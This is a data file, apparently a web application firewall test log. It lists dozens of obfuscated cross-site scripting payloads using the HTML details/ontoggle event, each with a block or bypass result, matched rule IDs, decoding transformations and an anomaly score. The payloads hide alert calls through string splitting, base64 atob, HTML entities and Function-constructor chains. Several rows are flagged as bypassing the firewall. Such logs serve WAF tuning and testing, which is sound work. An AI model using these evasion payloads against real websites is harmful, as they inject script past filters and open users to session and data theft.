693,"<details open ontoggle=""top['co'+'nstru'+'ctor']['co'+'nstru'+'ctor']('retu'+'rn ev'+'al')()('ale'+'rt(1)')"">",0,1,block,5,"933210,941100,941120,941370,949110","o27,80v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,24v217,109t:urlDecodeUni,t:compressWhitespace || ",20,177826515152.152883
702,"<details open ontoggle=""(function(){return this})()['ev'+'al'](atob('YWxlcnQoMSk='))"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,60v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,86 || o25,11v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826517165.759814
716,"<details open ontoggle=""Function['prototype']['constructor']('return\x20eval')().call(null,atob('YWxlcnQoMSk='))"">",0,1,block,4,"933210,941100,941120,949110","o32,80v217,114t:urlDecode,t:replaceComments,t:compressWhitespace || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826520090.047978
723,"<details open ontoggle=""top['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o27,50v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,89t:urlDecodeUni,t:compressWhitespace || ",20,177826521564.671607
726,"<details open ontoggle=""(0,window['Function'])('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o33,51v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o27,18v217,96t:urlDecodeUni,t:compressWhitespace || ",20,177826522213.584874
727,"<details open ontoggle=""parent['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o30,50v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826522491.855974
728,"<details open ontoggle=""self['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o28,50v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,90t:urlDecodeUni,t:compressWhitespace || ",20,177826522614.151575
729,"<details open ontoggle=""globalThis['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o34,50v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782652284.223474
731,"<details open ontoggle=""(0,top.Function)('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826523379.485938
735,"<details open ontoggle=""Reflect.get(window,'Function')('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826524186.338313
738,"<details open ontoggle=""(0,window.Function).apply(null,['&#97;&#108;&#101;&#114;&#116;(1)'])()""></details>",0,1,bypass,2,"941100,941120","v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826524866.119819
740,"<details open ontoggle=""(0,Object.getPrototypeOf(async function(){}).constructor)('&#97;&#108;&#101;&#114;&#116;(1)')()""></details>",0,1,block,5,"933210,934100,941100,941120,949110","o48,71v217,131t:urlDecode,t:replaceComments,t:compressWhitespace || o55,11v217,131 || v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826525298.859186
748,"<details open ontoggle=""(function(){return this})()['Function']('\x61\x6c\x65\x72\x74(29)')()""></details>",0,1,block,5,"933210,934100,941100,941120,949110","o24,69v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826526854.921883
762,"<details open ontoggle=""self['Function']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o28,29v217,59t:urlDecode,t:replaceComments,t:compressWhitespace || v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,59t:urlDecodeUni,t:compressWhitespace || ",20,177826529927.580642
763,"<details open ontoggle=""frames['Function']('al'+'ert(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o30,29v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826530142.469171
765,"<details open ontoggle=""(0,window['Function'])('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o33,30v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o27,18v217,65t:urlDecodeUni,t:compressWhitespace || ",20,177826530512.903083
772,"<details open ontoggle=""(function(){}).__proto__.constructor('al'+'ert(1)')()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,79 || o25,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826532091.135379
779,"<details open ontoggle=""[]['filter']['constructor']('ale'+'rt(15)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,45v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782653365.276908
781,"<details open ontoggle=""(1,window['Function'])('al'+'ert(15)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o33,31v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o27,18v217,76t:urlDecodeUni,t:compressWhitespace || ",20,177826534086.241550
783,"<details open ontoggle=""parent.Function('al'+'ert(15)')()""></details>",0,1,bypass,2,"941100,941120","v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826534494.761308
786,"<details open ontoggle=""globalThis.Function('al'+'ert(15)')()""></details>",0,1,bypass,2,"941100,941120","v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826535029.972116
798,"<details open ontoggle=""top['Function']('al'+String.fromCharCode(101)+'rt(1)')()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o27,53v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o45,19v217,82 || o45,19v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,82t:urlDecodeUni,t:compressWhitespace || ",30,177826537669.653333
799,"<details open ontoggle=""window['Function']('al'+String.fromCharCode(101)+'rt(1)')()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o30,53v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || o48,19v217,85 || o48,19v217,85t:urlDecodeUni || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,85t:urlDecodeUni,t:compressWhitespace || ",30,177826537844.611214
804,"<details open ontoggle=""(function(){})['constructor']('al'+'\x65'+'rt(1)')()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,52v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,78 || o25,11v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826538970.199838
806,"<details open ontoggle=""Reflect.construct(Function,[`al`+`ert(1)`])()"">",0,1,bypass,2,"941100,941120","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826539317.329402
815,"<details open ontoggle=""top['Function']('ale'+'rt(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,68t:urlDecodeUni,t:compressWhitespace || ",20,17782654123.715368
816,"<details open ontoggle=""self['Function']('ale'+'rt(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o28,29v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,69t:urlDecodeUni,t:compressWhitespace || ",20,177826541595.040994
817,"<details open ontoggle=""parent['Function']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o30,29v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826541734.753503
818,"<details open ontoggle=""frames['Function']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o30,29v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826541919.192889
819,"<details open ontoggle=""globalThis['Function']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o34,29v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826542152.431813
821,"<details open ontoggle=""[].filter.constructor('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826542576.580239
826,"<details open ontoggle=""(()=>{}).constructor('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826543664.799474
829,"<details open ontoggle=""[]['find']['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,42v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826544295.510350
830,"<details open ontoggle=""(a=>a)['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o30,32v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826544419.818729
831,"<details open ontoggle=""1..constructor.constructor('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17782654461.210723
854,"<details open ontoggle=""top['Function']('retur'+'n aler'+'t')()(1)"">",0,1,block,5,"933210,941100,941120,941370,949110","o27,39v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,68t:urlDecodeUni,t:compressWhitespace || ",20,177826549677.561645
856,"<details open ontoggle=""this['constr'+'uctor']['constr'+'uctor']('ale'+'rt(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o28,53v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,22v217,83t:urlDecodeUni,t:compressWhitespace || ",20,177826550017.035673
884,"<details open ontoggle=""[]['flat']['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,42v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826556132.238482
903,"<details open ontoggle=""!function(){window['Fu'+'nction'](atob('YWxlcnQoMSk='))()}()"">",0,1,block,8,"933210,934100,934100,941100,941120,941370,942190,949110","o33,51v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,86 || o25,11v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,21v217,86t:urlDecodeUni,t:compressWhitespace || o23,3v217,86t:urlDecodeUni || ",35,177826560489.103769
907,"<details open ontoggle=""with(top)Function(atob('YWxlcnQoMSk='))()"">",0,1,bypass,2,"941100,941120","v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826561216.380090
909,"<details open ontoggle=""document['defaultView']['Function'](atob('YWxlcnQoMSk='))()"">",0,1,block,5,"933210,941100,941120,941370,949110","o32,51v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,23v217,85t:urlDecodeUni,t:compressWhitespace || ",20,177826561733.498277
932,"<details open ontoggle=""[]['constructor']['constructor']('ale'+'rt(22)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,50v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826566635.515865
943,"<details open ontoggle=""Array['constructor']['constructor']('ale'+'rt(22)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o29,48v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826569056.120956
945,"<details open ontoggle=""window['Function']('ale'+'rt(22)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o30,30v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,72t:urlDecodeUni,t:compressWhitespace || ",20,177826569449.035301
950,"<details open ontoggle=""Object['constructor']['constructor']('ale'+'rt(22)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o30,48v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826570551.459832
951,"<details open ontoggle=""[]['constructor']['constructor']('ale'+'rt(8)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,49v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826570748.076485
955,"<details open ontoggle=""self['co'+'nstru'+'ctor']['co'+'nstru'+'ctor'](atob('YWxlcnQoOCk='))()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o28,66v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,25v217,106t:urlDecodeUni,t:compressWhitespace || ",20,177826571594.082300
959,"<details open ontoggle=""Reflect.construct([]['filter']['constructor'],[[atob('YWxlcnQoOCk=')]])()""></details>",0,1,bypass,2,"941100,941120","v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826572424.988872
965,"<details open ontoggle=""GeneratorFunction=Object.getPrototypeOf(function*(){}).constructor;(GeneratorFunction(atob('YWxlcnQoOCk=')))().next()""></details>",0,1,bypass,2,"941100,941120","v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826573725.307827
966,"<details open ontoggle=""AsyncFunction=Object.getPrototypeOf(async function(){}).constructor;(AsyncFunction(atob('YWxlcnQoOCk=')))()""></details>",0,1,block,4,"934100,941100,941120,949110","o66,11v217,143 || v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826574065.985082
975,"<details open ontoggle=""setTimeout(function(){top[atob('YWxlcnQ=')](1)},0)"">",0,1,block,6,"932105,934100,941100,941120,941370,949110","o43,6v217,76 || o35,11v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,21v217,76t:urlDecodeUni,t:compressWhitespace || ",25,177826575960.236807
977,"<details open ontoggle=""setTimeout(function(){this['al'+'ert'](1)},0)"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o34,35v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,71 || o35,11v217,71t:urlDecodeUni || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,16v217,71t:urlDecodeUni,t:compressWhitespace || ",30,177826576487.919991
978,"<details open ontoggle=""setTimeout(function(){parent['ale'+'rt'].call(this,1)},0)"">",0,1,block,5,"934100,934100,941100,941120,949110","o35,11v217,83 || o35,11v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826576626.550856
991,"<details open ontoggle=""setTimeout(function(){with(document)with(body)appendChild(createElement('script')).text='al'+'ert(1)';},0)"">",0,1,block,5,"934100,934100,941100,941120,949110","o35,11v217,132 || o35,11v217,132t:urlDecodeUni || v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826579460.428107
992,"<details open ontoggle=""setTimeout(function(){with(document)with(body)appendChild(createElement('script')).text=String.fromCharCode(97,108,101,114,116,40,49,41);},0)"">",0,1,block,4,"934100,941100,941120,949110","o35,11v217,167 || v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826579645.697369
993,"<details open ontoggle=""setTimeout(function(){with(document)with(body)appendChild(createElement('script')).text=atob('YWxlcnQoMSk=');},0)"">",0,1,block,4,"934100,941100,941120,949110","o35,11v217,139 || v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782657987.647822
994,"<details open ontoggle=""setTimeout(function(){with(document)with(body)appendChild(createElement('script')).text=`al${'ert'}(1)`;},0)"">",0,1,block,6,"932130,933180,934100,941100,941120,949110","o112,12v217,134t:urlDecodeUni,t:cmdLine || o115,17v217,134 || o35,11v217,134 || v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826580072.034376
995,"<details open ontoggle=""setTimeout(function(){with(document)with(body)appendChild(createElement('script')).text=window['ale'+'rt'](1);},0)"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o118,20v217,140t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,140 || o35,11v217,140t:urlDecodeUni || v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o51,79v217,140t:urlDecodeUni,t:compressWhitespace || ",30,177826580254.337156
996,"<details open ontoggle=""setTimeout(function(){document.body.appendChild(document.createElement('script')).innerHTML='al'+'ert(1)';},0)"">",0,1,block,6,"934100,934100,941100,941120,941180,949110","o35,11v217,136 || o35,11v217,136t:urlDecodeUni || v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o105,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:lowercase,t:removeNulls || ",25,17782658056.385226
